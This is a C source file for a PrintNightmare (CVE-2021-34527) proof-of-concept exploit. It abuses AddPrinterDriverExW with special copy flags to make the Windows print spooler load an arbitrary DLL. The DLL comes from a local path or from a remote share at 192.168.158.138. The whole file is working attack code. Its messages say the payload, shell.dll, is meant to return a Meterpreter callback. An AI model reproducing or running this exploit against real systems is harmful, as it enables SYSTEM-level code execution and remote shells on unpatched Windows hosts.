#include "headers.h"

// Test Command: .\CNightmare-CVE-2021-34527-POC.exe \\192.168.158.138\compdata\shell.dll 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'

wchar_t* GetArchitecture() {
	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);

	wchar_t * arch = NULL;

	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		arch = L"Windows x64";
	}
	else if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		arch = L"Windows x86";
	}

	return arch;
}


int main(int argc, char *argv[]) {

	if (argc == 1) {
		warn("Incorrect number of arguments supplied.");
		info("Usage: .\\poc.exe <path-to-dll> <driver-path>");
		info("Example Usage: .\\poc.exe \\\\192.168.158.138\\compdata\\shell.dll \'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\'");
		info("Example Usage: .\\poc.exe C:\\Users\\bob\\Desktop\\shell.dll \'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\'");
		return EXIT_FAILURE;
	}

	// Convert the DLL path to wchar_t
	char* remotePath = argv[1];
	size_t length = mbstowcs(NULL, remotePath, 0);
	wchar_t* pwcFilePath = (wchar_t*)malloc((length +1)*sizeof(wchar_t));
	mbstowcs(pwcFilePath, remotePath, length + 1);


	// Grab the dll name from the path
	wchar_t* pwcFileName = PathFindFileNameW(pwcFilePath);

	if (PathFileExistsW(pwcFilePath)) {
	}
	else {
		warn("Invalid path to malicious DLL provided");
		return EXIT_FAILURE;
	}

	// Convert the driver path to wchar_t
	size_t length2 = mbstowcs(NULL, argv[2], 0);
	wchar_t* pwcDriverPath = (wchar_t*)malloc((length2 + 1) * sizeof(wchar_t));
	mbstowcs(pwcDriverPath, argv[2], length2);

	DRIVER_INFO_2 pDriverInfo;

	pDriverInfo.cVersion = 2;
	pDriverInfo.pName = pwcFileName;
	pDriverInfo.pEnvironment = GetArchitecture();
	pDriverInfo.pDriverPath = pwcDriverPath;
	pDriverInfo.pConfigFile = L"C:\\Windows\\System32\\kernelbase.dll";
	pDriverInfo.pDataFile = pwcFilePath;
	
	AddPrinterDriverExW(NULL, 2, &pDriverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);

	if (GetLastError() != 0) {
		warn("An error has occured. Check your arguments");
	}
	else {
		okay("Check your meterpreter for a callback!");
	}

	pDriverInfo.pConfigFile = L"C:\\Windows\\system32\\spool\\DRIVERS\\x64\\3\\old\\1\\shell.dll";

	AddPrinterDriverExW(NULL, 2, &pDriverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);

	pDriverInfo.pConfigFile = L"C:\\Windows\\system32\\spool\\DRIVERS\\x64\\3\\old\\2\\shell.dll";

	AddPrinterDriverExW(NULL, 2, &pDriverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);

	pDriverInfo.pConfigFile = L"C:\\Windows\\system32\\spool\\DRIVERS\\x64\\3\\old\\3\\shell.dll";

	AddPrinterDriverExW(NULL, 2, &pDriverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);

	pDriverInfo.pConfigFile = L"C:\\Windows\\system32\\spool\\DRIVERS\\x64\\3\\old\\4\\shell.dll";

	AddPrinterDriverExW(NULL, 2, &pDriverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);


	free(pwcFilePath);
	free(pwcDriverPath);
	
	return EXIT_SUCCESS;
}